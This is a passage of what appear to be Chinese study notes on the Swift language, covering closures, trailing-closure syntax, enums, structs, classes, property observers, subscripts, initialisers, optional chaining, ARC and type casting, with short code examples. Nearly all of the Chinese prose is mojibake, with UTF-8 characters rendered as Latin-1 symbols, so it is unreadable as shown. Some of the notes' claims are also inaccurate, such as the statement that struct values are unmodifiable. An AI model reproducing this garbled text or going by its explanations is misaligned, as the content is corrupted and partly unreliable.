driver\") } è°ƒç”¨: driver ä½†æ˜¯è¿™å¹¶ä¸æ„å‘³ç€ä¸èƒ½ä½¿ç”¨å‚æ•°, éœ€è¦çš„å‚æ•°æ˜¯è¢«å†™åœ¨èŠ±æ‹¬å·é‡Œé¢çš„ : ä¸ºäº†è®©ä¸€ä¸ªé—­åŒ…æ¥æ”¶å‚æ•°ï¼Œ éœ€è¦åœ¨ èŠ±æ‹¬å·ä¹‹åæŠŠè¿™äº›å‚æ•°åˆ—å‡ºæ¥ï¼Œç„¶åè·Ÿä¸Šä¸€ä¸ª in å…³é”®å­— ã€‚ è¿™æ ·å°±å‘Šè¯‰Swiftï¼Œé—­åŒ…çš„ä¸»ä½“æ˜¯ä»å“ªé‡Œå¼€å§‹çš„: let driver = { (place: String) in print(\"is driver in \\(place)\") } å‡½æ•°å’Œé—­åŒ…çš„ä¸€ä¸ªåŒºåˆ«æ˜¯è¿è¡Œé—­åŒ…çš„æ—¶å€™ä½ ä¸ä¼šç”¨åˆ°å‚æ•°æ ‡ç­¾, ç›´æ¥è°ƒç”¨å³å¯: driver(\"ç§‹åå±±\") è‹¥éœ€è¦æŒ‡å®šè¿”å›å€¼: let driver = { (place: String) -> String in return \"is driver in \\(place)\" } æ‹–å°¾é—­åŒ…è¯­æ³• å¦‚æœä¸€ä¸ªå‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°æ˜¯é—­åŒ…ï¼Œ Swiftå…è®¸ä½ é‡‡ç”¨ä¸€ç§è¢«ç§°ä¸º \"æ‹–å°¾é—­åŒ…è¯­æ³•\" çš„æ–¹å¼æ¥è°ƒç”¨è¿™ä¸ªé—­åŒ…ã€‚ ä½ å¯ä»¥æŠŠé—­åŒ…ä¼ å…¥å‡½æ•°ä¹‹åçš„èŠ±æ‹¬å·é‡Œï¼Œè€Œä¸å¿…åƒä¼ å…¥å‚æ•°é‚£æ ·ã€‚ ä»¥ä¸‹ä¸ºä¾‹: func travel(action: () -> Void) { print(\"æˆ‘å‡†å¤‡å¼€è½¦äº†ã€‚\") action() print(\"æˆ‘å·²æŠµè¾¾ã€‚\") } æ­£å¸¸ä¸€èˆ¬ä¼šè¿™æ ·è°ƒç”¨: travel(action: driver) ç”±äºå‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°æ˜¯é—­åŒ…ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ‹–å°¾é—­åŒ…è¯­æ³•æ¥è°ƒç”¨ ä¸Šä¸€èŠ‚çš„driver: travel() { print(\"is driver\") } æˆ–è€…: travel() { print(\"is driver\") } å®é™…ä¸Šï¼Œç”±äºå‡½æ•°æ²¡æœ‰åˆ«çš„å‚æ•°äº†ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†åœ†æ‹¬å·å®Œå…¨ç§»é™¤: travel { print(\"is driver\") } è‹¥è¦æ¥å—å‚æ•°: func travel(action: (String) -> Void) ... è‹¥éœ€è¦å¸¦è¿”å›å€¼: travel { (place: String) -> String in return \"is driver in \\(place)\" } è‹¥çŸ¥é“placeä¸è¿”å›ç±»å‹, å¯ä»¥å»æ‰æ³¨è§£, åŒæ—¶å› ä¸ºä¸»ä½“åªæœ‰ä¸€è¡Œä»£ç , æ‰€ä»¥returnä¹Ÿå¯ä»¥å»æ‰, å³: travel { place in \"is driver in \\(place)\" } Swiftè¿˜æä¾›ä¸€ç§é€Ÿè®°è¯­æ³•ï¼Œè®©ä½ å¯ä»¥æŠŠä»£ç å˜å¾—æ›´çŸ­ã€‚ æˆ‘ä»¬å¯ä»¥è®©Swiftä¸ºé—­åŒ…çš„å‚æ•°è‡ªåŠ¨æä¾›ä¸€ä¸ªåå­—ï¼Œè€Œä¸å¿…è‡ªè¡Œå†™ä¸‹ place inã€‚ è¿™äº›è‡ªåŠ¨ç”Ÿæˆçš„åå­—ä»¥$å¼€å¤´ï¼Œç„¶åè·Ÿç€ä¸€ä¸ªä»0å¼€å§‹çš„æ•´æ•°ï¼Œå°±åƒä¸‹é¢è¿™æ ·: travel { \"is driver in \\($0)ã€‚\" } Swift æšä¸¾ æšä¸¾ç®€å•çš„è¯´ä¹Ÿæ˜¯ä¸€ç§æ•°æ®ç±»å‹ï¼Œåªä¸è¿‡æ˜¯è¿™ç§æ•°æ®ç±»å‹åªåŒ…å«è‡ªå®šä¹‰çš„ç‰¹å®šæ•°æ®ï¼Œå®ƒæ˜¯ä¸€ç»„æœ‰å…±åŒç‰¹æ€§çš„æ•°æ®çš„é›†åˆã€‚ Swift çš„æšä¸¾ç±»ä¼¼äº Objective C å’Œ C çš„ç»“æ„ï¼Œæšä¸¾çš„åŠŸèƒ½ä¸º: å®ƒå£°æ˜åœ¨ç±»ä¸­ï¼Œå¯ä»¥é€šè¿‡å®ä¾‹åŒ–ç±»æ¥è®¿é—®å®ƒçš„å€¼ã€‚ æšä¸¾ä¹Ÿå¯ä»¥å®šä¹‰æ„é€ å‡½æ•°ï¼ˆinitializersï¼‰æ¥æä¾›ä¸€ä¸ªåˆå§‹æˆå‘˜å€¼ï¼›å¯ä»¥åœ¨åŸå§‹çš„å®ç°åŸºç¡€ä¸Šæ‰©å±•å®ƒä»¬çš„åŠŸèƒ½ã€‚ å¯ä»¥éµå®ˆåè®®ï¼ˆprotocolsï¼‰æ¥æä¾›æ ‡å‡†çš„åŠŸèƒ½ã€‚ å®šä¹‰: enum enumname { // æšä¸¾å®šä¹‰æ”¾åœ¨è¿™é‡Œ case å˜é‡ } caseå…³é”®è¯è¡¨ç¤ºä¸€è¡Œæ–°çš„æˆå‘˜å€¼å°†è¢«å®šä¹‰ã€‚ é‡è¦ å’Œ C å’Œ Objective-C ä¸åŒï¼ŒSwift çš„æšä¸¾æˆå‘˜åœ¨è¢«åˆ›å»ºæ—¶ä¸ä¼šè¢«èµ‹äºˆä¸€ä¸ªé»˜è®¤çš„æ•´å‹å€¼ Swift ç»“æ„ä½“ Swift ç»“æ„ä½“æ˜¯æ„å»ºä»£ç æ‰€ç”¨çš„ä¸€ç§é€šç”¨ä¸”çµæ´»çš„æ„é€ ä½“ã€‚ æˆ‘ä»¬å¯ä»¥ä¸ºç»“æ„ä½“å®šä¹‰å±æ€§ï¼ˆå¸¸é‡ã€å˜é‡ï¼‰å’Œæ·»åŠ æ–¹æ³•ï¼Œä»è€Œæ‰©å±•ç»“æ„ä½“çš„åŠŸèƒ½ã€‚ ä¸ C å’Œ Objective C ä¸åŒçš„æ˜¯ï¼š ç»“æ„ä½“ä¸éœ€è¦åŒ…å«å®ç°æ–‡ä»¶å’Œæ¥å£ã€‚ ç»“æ„ä½“å…è®¸æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå•ä¸€æ–‡ä»¶ï¼Œä¸”ç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆé¢å‘å…¶å®ƒä»£ç çš„å¤–éƒ¨æ¥å£ã€‚ ç»“æ„ä½“æ€»æ˜¯é€šè¿‡è¢«å¤åˆ¶çš„æ–¹å¼åœ¨ä»£ç ä¸­ä¼ é€’ï¼Œå› æ­¤å®ƒçš„å€¼æ˜¯ä¸å¯ä¿®æ”¹çš„ã€‚ å€¼ä¼ é€’ é€šè¿‡å…³é”®å­— struct æ¥å®šä¹‰ç»“æ„ä½“: struct nameStruct { Definition 1 Definition 2 â€¦â€¦ Definition N } Swift ç±» åœ¨ä¸€ä¸ªå•ä¸€æ–‡ä»¶ä¸­å®šä¹‰ä¸€ä¸ªç±»ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆé¢å‘å…¶å®ƒä»£ç çš„å¤–éƒ¨æ¥å£ã€‚ æ’ç­‰è¿ç®—ç¬¦ åˆ¤å®šä¸¤ä¸ªå¸¸é‡æˆ–è€…å˜é‡æ˜¯å¦å¼•ç”¨åŒä¸€ä¸ªç±»å®ä¾‹ï¼ŒSwift å†…å»ºäº†ä¸¤ä¸ªæ’ç­‰è¿ç®—ç¬¦ === : ä¸¤ä¸ªå¸¸é‡æˆ–è€…å˜é‡å¼•ç”¨åŒä¸€ä¸ªç±»å®ä¾‹åˆ™è¿”å› true !== : ä¸¤ä¸ªå¸¸é‡æˆ–è€…å˜é‡å¼•ç”¨ä¸åŒä¸€ä¸ªç±»å®ä¾‹åˆ™è¿”å› true Swift å±æ€§ å­˜å‚¨å±æ€§ ä¸€ä¸ªå­˜å‚¨å±æ€§å°±æ˜¯å­˜å‚¨åœ¨ç‰¹å®šç±»æˆ–ç»“æ„ä½“çš„å®ä¾‹é‡Œçš„ä¸€ä¸ªå¸¸é‡æˆ–å˜é‡ å»¶è¿Ÿå­˜å‚¨å±æ€§ å½“ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨çš„æ—¶å€™æ‰ä¼šè®¡ç®—å…¶åˆå§‹å€¼çš„å±æ€§ åœ¨å±æ€§å£°æ˜å‰ä½¿ç”¨ lazy æ¥æ ‡ç¤ºä¸€ä¸ªå»¶è¿Ÿå­˜å‚¨å±æ€§, ä¸”å¿…é¡»å£°æ˜ä¸ºvarå˜é‡ ä¸€èˆ¬ç”¨äºï¼š å»¶è¿Ÿå¯¹è±¡çš„åˆ›å»ºã€‚ å½“å±æ€§çš„å€¼ä¾èµ–äºå…¶ä»–æœªçŸ¥ç±» è®¡ç®—å±æ€§ é™¤å­˜å‚¨å±æ€§å¤–ï¼Œç±»ã€ç»“æ„ä½“å’Œæšä¸¾å¯ä»¥å®šä¹‰è®¡ç®—å±æ€§ï¼Œè®¡ç®—å±æ€§ä¸ç›´æ¥å­˜å‚¨å€¼ï¼Œ è€Œæ˜¯æä¾›ä¸€ä¸ª getter æ¥è·å–å€¼ï¼Œä¸€ä¸ªå¯é€‰çš„ setter æ¥é—´æ¥è®¾ç½®å…¶ä»–å±æ€§æˆ–å˜é‡çš„å€¼ã€‚ åªè¯»è®¡ç®—å±æ€§ åªæœ‰ getter æ²¡æœ‰ setter çš„è®¡ç®—å±æ€§å°±æ˜¯åªè¯»è®¡ç®—å±æ€§ å±æ€§è§‚å¯Ÿå™¨ å±æ€§è§‚å¯Ÿå™¨ç›‘æ§å’Œå“åº”å±æ€§å€¼çš„å˜åŒ– ä¸éœ€è¦ä¸ºæ— æ³•é‡è½½çš„è®¡ç®—å±æ€§æ·»åŠ å±æ€§è§‚å¯Ÿå™¨ï¼Œå› ä¸ºå¯ä»¥é€šè¿‡ setter ç›´æ¥ç›‘æ§å’Œå“åº”å€¼çš„å˜åŒ–ã€‚ å¯ä»¥ä¸ºå±æ€§æ·»åŠ å¦‚ä¸‹çš„ä¸€ä¸ªæˆ–å…¨éƒ¨è§‚å¯Ÿå™¨ï¼š willSetåœ¨è®¾ç½®æ–°çš„å€¼ä¹‹å‰è°ƒç”¨ didSetåœ¨æ–°çš„å€¼è¢«è®¾ç½®ä¹‹åç«‹å³è°ƒç”¨ willSetå’ŒdidSetè§‚å¯Ÿå™¨åœ¨å±æ€§åˆå§‹åŒ–è¿‡ç¨‹ä¸­ä¸ä¼šè¢«è°ƒç”¨ Swift æ–¹æ³• self å±æ€§ ç±»å‹çš„æ¯ä¸€ä¸ªå®ä¾‹éƒ½æœ‰ä¸€ä¸ªéšå«å±æ€§å«åšselfï¼Œself å®Œå…¨ç­‰åŒäºè¯¥å®ä¾‹æœ¬èº«ï¼Œ ç›¸å½“äºJavaçš„this åœ¨å®ä¾‹æ–¹æ³•ä¸­ä¿®æ”¹å€¼ç±»å‹ Swift è¯­è¨€ä¸­ç»“æ„ä½“å’Œæšä¸¾æ˜¯å€¼ç±»å‹ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå€¼ç±»å‹çš„å±æ€§ä¸èƒ½åœ¨å®ƒçš„å®ä¾‹æ–¹æ³•ä¸­è¢«ä¿®æ”¹ è‹¥ç¡®å®éœ€è¦ä¿®æ”¹ï¼Œ å¯ä»¥é€‰æ‹©å˜å¼‚(mutating)è¿™ä¸ªæ–¹æ³•ï¼Œç„¶åæ–¹æ³•å°±å¯ä»¥ä»æ–¹æ³•å†…éƒ¨æ”¹å˜å®ƒçš„å±æ€§ï¼› å¹¶ä¸”å®ƒåšçš„ä»»ä½•æ”¹å˜åœ¨æ–¹æ³•ç»“æŸæ—¶è¿˜ä¼šä¿ç•™åœ¨åŸå§‹ç»“æ„ä¸­ã€‚ æ–¹æ³•è¿˜å¯ä»¥ç»™å®ƒéšå«çš„selfå±æ€§èµ‹å€¼ä¸€ä¸ªå…¨æ–°çš„å®ä¾‹ï¼Œè¿™ä¸ªæ–°å®ä¾‹åœ¨æ–¹æ³•ç»“æŸåå°†æ›¿æ¢åŸæ¥çš„å®ä¾‹ åœ¨å¯å˜æ–¹æ³•ä¸­ç»™ self èµ‹å€¼ å¯å˜æ–¹æ³•èƒ½å¤Ÿèµ‹ç»™éšå«å±æ€§ self ä¸€ä¸ªå…¨æ–°çš„å®ä¾‹ã€‚ ç±»å‹æ–¹æ³• å°±æ˜¯ç±»æ–¹æ³• Swift ä¸‹æ ‡ æŸäº›æ–¹é¢ä¹Ÿå¯ä»¥ç†è§£ä¸ºå¢åŠ ç±»ä¼¼æ•°ç»„çš„åŠŸèƒ½ ä¸‹æ ‡è„šæœ¬å…è®¸ä½ é€šè¿‡åœ¨å®ä¾‹åé¢çš„æ–¹æ‹¬å·ä¸­ä¼ å…¥ä¸€ä¸ªæˆ–è€…å¤šä¸ªçš„ç´¢å¼•å€¼æ¥å¯¹å®ä¾‹è¿›è¡Œè®¿é—®å’Œèµ‹å€¼ã€‚ è¯­æ³•ç±»ä¼¼äºå®ä¾‹æ–¹æ³•å’Œè®¡ç®—å‹å±æ€§çš„æ··åˆã€‚ ä¸å®šä¹‰å®ä¾‹æ–¹æ³•ç±»ä¼¼ï¼Œå®šä¹‰ä¸‹æ ‡è„šæœ¬ä½¿ç”¨subscriptå…³é”®å­—ï¼Œæ˜¾å¼å£°æ˜å…¥å‚ï¼ˆä¸€ä¸ªæˆ–å¤šä¸ªï¼‰å’Œè¿”å›ç±»å‹ã€‚ ä¸å®ä¾‹æ–¹æ³•ä¸åŒçš„æ˜¯ä¸‹æ ‡è„šæœ¬å¯ä»¥è®¾å®šä¸ºè¯»å†™æˆ–åªè¯»ã€‚è¿™ç§æ–¹å¼åˆæœ‰ç‚¹åƒè®¡ç®—å‹å±æ€§çš„getterå’Œsetter: subscript(index: Int) -> Int { get { // ç”¨äºä¸‹æ ‡è„šæœ¬å€¼çš„å£°æ˜ } set(newValue) { // æ‰§è¡Œèµ‹å€¼æ“ä½œ } } å‚è€ƒ: https://www.runoob.com/swift/swift-subscripts.html å®ä¾‹: import Cocoa struct subexample { let decrementer: Int subscript(index: Int) -> Int { return decrementer / index } } let division = subexample(decrementer: 100) print(\"100 é™¤ä»¥ 9 ç­‰äº \\(division[9])\") print(\"100 é™¤ä»¥ 2 ç­‰äº \\(division[2])\") print(\"100 é™¤ä»¥ 3 ç­‰äº \\(division[3])\") print(\"100 é™¤ä»¥ 5 ç­‰äº \\(division[5])\") print(\"100 é™¤ä»¥ 7 ç­‰äº \\(division[7])\") ç”¨æ³• æ ¹æ®ä½¿ç”¨åœºæ™¯ä¸åŒä¸‹æ ‡è„šæœ¬ä¹Ÿå…·æœ‰ä¸åŒçš„å«ä¹‰ã€‚ é€šå¸¸ä¸‹æ ‡è„šæœ¬æ˜¯ç”¨æ¥è®¿é—®é›†åˆï¼ˆcollectionï¼‰ï¼Œåˆ—è¡¨ï¼ˆlistï¼‰æˆ–åºåˆ—ï¼ˆsequenceï¼‰ä¸­å…ƒç´ çš„å¿«æ·æ–¹å¼ã€‚ ä½ å¯ä»¥åœ¨ä½ è‡ªå·±ç‰¹å®šçš„ç±»æˆ–ç»“æ„ä½“ä¸­è‡ªç”±çš„å®ç°ä¸‹æ ‡è„šæœ¬æ¥æä¾›åˆé€‚çš„åŠŸèƒ½ã€‚ Swift ç»§æ‰¿ ç»§æ‰¿ ä½¿ç”¨å†’å· é‡å†™ï¼ˆOverridingï¼‰ å­ç±»å¯ä»¥é€šè¿‡ç»§æ‰¿æ¥çš„å®ä¾‹æ–¹æ³•ï¼Œç±»æ–¹æ³•ï¼Œå®ä¾‹å±æ€§ï¼Œ æˆ–ä¸‹æ ‡è„šæœ¬æ¥å®ç°è‡ªå·±çš„å®šåˆ¶åŠŸèƒ½ï¼Œæˆ‘ä»¬æŠŠè¿™ç§è¡Œä¸ºå«é‡å†™ï¼ˆoverridingï¼‰ã€‚ å­ç±»å¯ä»¥é€šè¿‡ç»§æ‰¿æ¥çš„å®ä¾‹æ–¹æ³•ï¼Œç±»æ–¹æ³•ï¼Œå®ä¾‹å±æ€§ï¼Œæˆ–ä¸‹æ ‡è„šæœ¬æ¥å®ç°è‡ªå·±çš„å®šåˆ¶åŠŸèƒ½ï¼Œ æŠŠè¿™ç§è¡Œä¸ºå«é‡å†™ï¼ˆoverridingï¼‰ã€‚ é˜²æ­¢é‡å†™ ä½¿ç”¨ final å…³é”®å­—é˜²æ­¢å®ƒä»¬è¢«é‡å†™ã€‚ Swift æ„é€ è¿‡ç¨‹ æ„é€ å‡½æ•°ä½¿ç”¨ init() æ–¹æ³• ç±»å®ä¾‹ä¹Ÿå¯ä»¥é€šè¿‡å®šä¹‰ææ„å™¨ï¼ˆdeinitializerï¼‰åœ¨ç±»å®ä¾‹é‡Šæ”¾ä¹‹å‰æ‰§è¡Œæ¸…ç†å†…å­˜çš„å·¥ä½œã€‚ å­˜å‚¨å‹å±æ€§çš„åˆå§‹èµ‹å€¼ ç±»å’Œç»“æ„ä½“åœ¨å®ä¾‹åˆ›å»ºæ—¶ï¼Œå¿…é¡»ä¸ºæ‰€æœ‰å­˜å‚¨å‹å±æ€§è®¾ç½®åˆé€‚çš„åˆå§‹å€¼ã€‚ å­˜å‚¨å±æ€§åœ¨æ„é€ å™¨ä¸­èµ‹å€¼æ—¶ï¼Œå®ƒä»¬çš„å€¼æ˜¯è¢«ç›´æ¥è®¾ç½®çš„ï¼Œä¸ä¼šè§¦å‘ä»»ä½•å±æ€§è§‚æµ‹å™¨ã€‚ å­˜å‚¨å±æ€§åœ¨æ„é€ å™¨ä¸­èµ‹å€¼æµç¨‹ï¼š åˆ›å»ºåˆå§‹å€¼ã€‚ åœ¨å±æ€§å®šä¹‰ä¸­æŒ‡å®šé»˜è®¤å±æ€§å€¼ã€‚ åˆå§‹åŒ–å®ä¾‹ï¼Œå¹¶è°ƒç”¨ init() æ–¹æ³•ã€‚ æ„é€ è¿‡ç¨‹ä¸­ä¿®æ”¹å¸¸é‡å±æ€§ åªè¦åœ¨æ„é€ è¿‡ç¨‹ç»“æŸå‰å¸¸é‡çš„å€¼èƒ½ç¡®å®šï¼Œä½ å¯ä»¥åœ¨æ„é€ è¿‡ç¨‹ä¸­çš„ä»»æ„æ—¶é—´ç‚¹ä¿®æ”¹å¸¸é‡å±æ€§çš„å€¼ å¯¹æŸä¸ªç±»å®ä¾‹æ¥è¯´ï¼Œå®ƒçš„å¸¸é‡å±æ€§åªèƒ½åœ¨å®šä¹‰å®ƒçš„ç±»çš„æ„é€ è¿‡ç¨‹ä¸­ä¿®æ”¹ï¼›ä¸èƒ½åœ¨å­ç±»ä¸­ä¿®æ”¹ã€‚ é»˜è®¤æ„é€ å™¨ é»˜è®¤æ„é€ å™¨å°†ç®€å•çš„åˆ›å»ºä¸€ä¸ªæ‰€æœ‰å±æ€§å€¼éƒ½è®¾ç½®ä¸ºé»˜è®¤å€¼çš„å®ä¾‹: ç»“æ„ä½“çš„é€ä¸€æˆå‘˜æ„é€ å™¨ å¦‚æœç»“æ„ä½“å¯¹æ‰€æœ‰å­˜å‚¨å‹å±æ€§æä¾›äº†é»˜è®¤å€¼ä¸”è‡ªèº«æ²¡æœ‰æä¾›å®šåˆ¶çš„æ„é€ å™¨ï¼Œ å®ƒä»¬èƒ½è‡ªåŠ¨è·å¾—ä¸€ä¸ªé€ä¸€æˆå‘˜æ„é€ å™¨ å¦‚: struct Rectangle { var length = 100.0, breadth = 200.0 } let area = Rectangle(length: 24.0, breadth: 32.0) print(\"çŸ©å½¢çš„é¢ç§¯: \\(area.length)\") print(\"çŸ©å½¢çš„é¢ç§¯: \\(area.breadth)\") å€¼ç±»å‹çš„æ„é€ å™¨ä»£ç† æ„é€ å™¨å¯ä»¥é€šè¿‡è°ƒç”¨å…¶å®ƒæ„é€ å™¨æ¥å®Œæˆå®ä¾‹çš„éƒ¨åˆ†æ„é€ è¿‡ç¨‹ã€‚ è¿™ä¸€è¿‡ç¨‹ç§°ä¸ºæ„é€ å™¨ä»£ç†ï¼Œå®ƒèƒ½å‡å°‘å¤šä¸ªæ„é€ å™¨é—´çš„ä»£ç é‡å¤ã€‚ æ„é€ å™¨çš„ç»§æ‰¿å’Œé‡è½½ Swift ä¸­çš„å­ç±»ä¸ä¼šé»˜è®¤ç»§æ‰¿çˆ¶ç±»çš„æ„é€ å™¨ã€‚ çˆ¶ç±»çš„æ„é€ å™¨ä»…åœ¨ç¡®å®šå’Œå®‰å…¨çš„æƒ…å†µä¸‹è¢«ç»§æ‰¿ã€‚ å½“ä½ é‡å†™ä¸€ä¸ªçˆ¶ç±»æŒ‡å®šæ„é€ å™¨æ—¶ï¼Œä½ éœ€è¦å†™overrideä¿®é¥°ç¬¦ å¯å¤±è´¥æ„é€ å™¨ å¯ä»¥åœ¨ä¸€ä¸ªç±»ï¼Œç»“æ„ä½“æˆ–æ˜¯æšä¸¾ç±»å‹çš„å®šä¹‰ä¸­ï¼Œæ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªå¯å¤±è´¥æ„é€ å™¨ã€‚ å…¶è¯­æ³•ä¸ºåœ¨initå…³é”®å­—åé¢åŠ æ·»é—®å·(init?)ã€‚ Swift ææ„è¿‡ç¨‹ åœ¨ä¸€ä¸ªç±»çš„å®ä¾‹è¢«é‡Šæ”¾ä¹‹å‰ï¼Œææ„å‡½æ•°è¢«ç«‹å³è°ƒç”¨ã€‚ ç”¨å…³é”®å­—deinitæ¥æ ‡ç¤ºææ„å‡½æ•°ï¼Œç±»ä¼¼äºåˆå§‹åŒ–å‡½æ•°ç”¨initæ¥æ ‡ç¤ºã€‚ææ„å‡½æ•°åªé€‚ç”¨äºç±»ç±»å‹ã€‚ Swift å¯é€‰é“¾ å‚è€ƒ: https://www.runoob.com/swift/swift-optional-chaining.html è°ƒç”¨æ—¶å€™ä½¿ç”¨é—®å·/å¹å·ï¼Œ é—®å·è¡¨ç¤ºå¯èƒ½ä¸ºç©ºï¼Œ ä¸ºç©ºåˆ™ä¸ç»§ç»­è°ƒç”¨ å¹å·è¡¨ç¤ºå¼ºåˆ¶è°ƒç”¨ï¼ˆæœ€å¥½ç¡®å®šä¸€å®šå¯ä»¥è°ƒç”¨ï¼‰ æ³¨è§£ è¿™ç‚¹ä¸tsåŸºæœ¬ä¸€è‡´ Swift è‡ªåŠ¨å¼•ç”¨è®¡æ•°ï¼ˆARCï¼‰ Swift ä½¿ç”¨è‡ªåŠ¨å¼•ç”¨è®¡æ•°ï¼ˆARCï¼‰è¿™ä¸€æœºåˆ¶æ¥è·Ÿè¸ªå’Œç®¡ç†åº”ç”¨ç¨‹åºçš„å†…å­˜ é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬ä¸éœ€è¦å»æ‰‹åŠ¨é‡Šæ”¾å†…å­˜ï¼Œå› ä¸º ARC ä¼šåœ¨ç±»çš„å®ä¾‹ä¸å†è¢«ä½¿ç”¨æ—¶ï¼Œè‡ªåŠ¨é‡Šæ”¾å…¶å ç”¨çš„å†…å­˜ã€‚ ä½†åœ¨æœ‰äº›æ—¶å€™æˆ‘ä»¬è¿˜æ˜¯éœ€è¦åœ¨ä»£ç ä¸­å®ç°å†…å­˜ç®¡ç†ã€‚ ARC åŠŸèƒ½ å½“æ¯æ¬¡ä½¿ç”¨ init() æ–¹æ³•åˆ›å»ºä¸€ä¸ªç±»çš„æ–°çš„å®ä¾‹çš„æ—¶å€™ï¼ŒARC ä¼šåˆ†é…ä¸€å¤§å—å†…å­˜ç”¨æ¥å‚¨å­˜å®ä¾‹çš„ä¿¡æ¯ã€‚ å†…å­˜ä¸­ä¼šåŒ…å«å®ä¾‹çš„ç±»å‹ä¿¡æ¯ï¼Œä»¥åŠè¿™ä¸ªå®ä¾‹æ‰€æœ‰ç›¸å…³å±æ€§çš„å€¼ã€‚ å½“å®ä¾‹ä¸å†è¢«ä½¿ç”¨æ—¶ï¼ŒARC é‡Šæ”¾å®ä¾‹æ‰€å ç”¨çš„å†…å­˜ï¼Œå¹¶è®©é‡Šæ”¾çš„å†…å­˜èƒ½æŒªä½œä»–ç”¨ã€‚ ä¸ºäº†ç¡®ä¿ä½¿ç”¨ä¸­çš„å®ä¾‹ä¸ä¼šè¢«é”€æ¯ï¼ŒARC ä¼šè·Ÿè¸ªå’Œè®¡ç®—æ¯ä¸€ä¸ªå®ä¾‹æ­£åœ¨è¢«å¤šå°‘å±æ€§ï¼Œå¸¸é‡å’Œå˜é‡æ‰€å¼•ç”¨ã€‚ å®ä¾‹èµ‹å€¼ç»™å±æ€§ã€å¸¸é‡æˆ–å˜é‡ï¼Œå®ƒä»¬éƒ½ä¼šåˆ›å»ºæ­¤å®ä¾‹çš„å¼ºå¼•ç”¨ï¼Œåªè¦å¼ºå¼•ç”¨è¿˜åœ¨ï¼Œå®ä¾‹æ˜¯ä¸å…è®¸è¢«é”€æ¯çš„ã€‚ ç±»å®ä¾‹ä¹‹é—´çš„å¾ªç¯å¼ºå¼•ç”¨ å¾ªç¯å¼•ç”¨ï¼Œ æ°¸è¿œä¸ä¼šè¢«å›æ”¶ Swift æä¾›äº†ä¸¤ç§åŠæ³•ç”¨æ¥è§£å†³ä½ åœ¨ä½¿ç”¨ç±»çš„å±æ€§æ—¶æ‰€é‡åˆ°çš„å¾ªç¯å¼ºå¼•ç”¨é—®é¢˜ å¼±å¼•ç”¨: weak var å˜é‡ æ— ä¸»å¼•ç”¨: unowned let å˜é‡ å¼±å¼•ç”¨å’Œæ— ä¸»å¼•ç”¨å…è®¸å¾ªç¯å¼•ç”¨ä¸­çš„ä¸€ä¸ªå®ä¾‹å¼•ç”¨å¦å¤–ä¸€ä¸ªå®ä¾‹è€Œä¸ä¿æŒå¼ºå¼•ç”¨ã€‚ è¿™æ ·å®ä¾‹èƒ½å¤Ÿäº’ç›¸å¼•ç”¨è€Œä¸äº§ç”Ÿå¾ªç¯å¼ºå¼•ç”¨ã€‚ å¯¹äºç”Ÿå‘½å‘¨æœŸä¸­ä¼šå˜ä¸ºnilçš„å®ä¾‹ä½¿ç”¨å¼±å¼•ç”¨ã€‚ ç›¸åçš„ï¼Œå¯¹äºåˆå§‹åŒ–èµ‹å€¼åå†ä¹Ÿä¸ä¼šè¢«èµ‹å€¼ä¸ºnilçš„å®ä¾‹ï¼Œä½¿ç”¨æ— ä¸»å¼•ç”¨ã€‚ å¾ªç¯å¼ºå¼•ç”¨è¿˜ä¼šå‘ç”Ÿåœ¨å½“ä½ å°†ä¸€ä¸ªé—­åŒ…èµ‹å€¼ç»™ç±»å®ä¾‹çš„æŸä¸ªå±æ€§ï¼Œ å¹¶ä¸”è¿™ä¸ªé—­åŒ…ä½“ä¸­åˆä½¿ç”¨äº†å®ä¾‹ Swift ç±»å‹è½¬æ¢ Swift è¯­è¨€ç±»å‹è½¬æ¢å¯ä»¥åˆ¤æ–­å®ä¾‹çš„ç±»å‹ã€‚ä¹Ÿå¯ä»¥ç”¨äºæ£€æµ‹å®ä¾‹ç±»å‹æ˜¯å¦å±äºå…¶çˆ¶ç±»æˆ–è€…å­ç±»çš„å®ä¾‹ã€‚ is: æ£€æµ‹å€¼çš„ç±»å‹ as: è½¬æ¢ç±»å‹ å‘ä¸‹è½¬å‹ å‘ä¸‹è½¬å‹ï¼Œç”¨ç±»å‹è½¬æ¢æ“ä½œç¬¦(as? æˆ– as!) å½“ä½ ä¸ç¡®å®šå‘ä¸‹è½¬å‹å¯ä»¥æˆåŠŸæ—¶ï¼Œç”¨ç±»å‹è½¬æ¢çš„æ¡ä»¶å½¢å¼(as?)ã€‚ æ¡ä»¶å½¢å¼çš„ç±»å‹è½¬æ¢æ€»æ˜¯è¿”å›ä¸€ä¸ªå¯é€‰å€¼ï¼ˆoptional valueï¼‰ï¼Œ å¹¶ä¸”è‹¥ä¸‹è½¬æ˜¯ä¸å¯èƒ½çš„ï¼Œå¯é€‰å€¼å°†æ˜¯ nilã€‚ åªæœ‰ä½ å¯ä»¥ç¡®å®šå‘ä¸‹è½¬å‹ä¸€å®šä¼šæˆåŠŸæ—¶ï¼Œæ‰ä½¿ç”¨å¼ºåˆ¶å½¢å¼(as!)ã€‚ å½“ä½ è¯•å›¾å‘ä¸‹è½¬å‹ä¸ºä¸€ä¸ªä¸æ­£ç¡®çš„ç±»å‹æ—¶ï¼Œå¼ºåˆ¶å½¢å¼çš„ç±»å‹è½¬æ¢ä¼šè§¦å‘ä¸€ä¸ªè¿è¡Œæ—¶é”™è¯¯ã€‚ Anyå’ŒAnyObjectçš„ç±»å‹è½¬æ¢ Swiftä¸ºä¸ç¡®å®šç±»å‹æä¾›äº†ä¸¤ç§ç‰¹æ®Šç±»å‹åˆ«åï¼š AnyObjectå¯ä»¥ä»£è¡¨ä»»ä½•classç±»å‹çš„å®ä¾‹ã€‚ Anyå¯ä»¥è¡¨ç¤ºä»»ä½•ç±»å‹ï¼ŒåŒ…æ‹¬æ–¹æ³•ç±»å‹ï¼ˆfunction typesï¼‰ã€‚ åªæœ‰å½“ä½ æ˜ç¡®çš„éœ€è¦å®ƒçš„è¡Œä¸ºå’ŒåŠŸèƒ½æ—¶æ‰ä½¿ç”¨Anyå’ŒAnyObjectã€‚ 